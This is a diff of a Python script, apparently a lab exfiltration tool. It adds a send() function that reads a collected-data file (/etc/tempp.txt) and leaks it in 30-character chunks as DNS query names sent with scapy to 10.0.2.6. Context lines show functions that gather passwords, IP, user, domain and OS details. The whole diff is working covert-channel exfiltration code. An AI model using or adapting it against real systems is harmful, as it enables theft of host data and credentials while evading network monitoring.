@@ -62,10 +62,32 @@ def print_domain():
     fd_ip=popen("domainname -i").read()
     
 def send():
+    temp1=""
+    f=open("/etc/tempp.txt")
+    lines=f.readlines()
+    for i in range(len(lines)):
+        temp1+=lines[i]
+         
+        if(len(temp1)>30):
+            temp2=temp1[30:]
+            temp1=temp1[0:30]
+            
+            print("The packet string is BEFORE:",temp1,"\n")
+            
+            print("The string in the lines :",lines[i],"\n")
+            
+            dns_req = IP(dst='10.0.2.6')/UDP(sport =53,dport=53)/DNS(rd=1, qd=DNSQR(qname=temp1))#36
+            answer = sr1(dns_req, verbose=1)
+            temp1=temp2
+            print("The packet string is AFTER:",temp2,"\n")
+    dns_req = IP(dst='10.0.2.6')/UDP(sport =53,dport=53)/DNS(rd=1, qd=DNSQR(qname=temp1))#36
+    answer = sr1(dns_req, verbose=1)
     
-    f=open("/etc/tempp.txt",r)
-    dns_req=IP(dst='10.0.0.1')/TCP(sport=53,dport=53)/DNS(rd=1,qd=DNSQR(qname="sadsadsadsadsa"))
-    answer=sr1(dns_req,verbose=1)
+
+
+
+
+        
            
 
 
@@ -77,13 +99,14 @@ def print_os():
    
 
 def main():
-    print_passwords()
+    #print_passwords()
     
-    print_ip()
-    print_user()
-    print_domain()
-    print_os()
-    save_file()
+    #print_ip()
+    #print_user()
+    #print_domain()
+    #print_os()
+    #save_file()
+    send()
     
 
 if __name__ == "__main__":
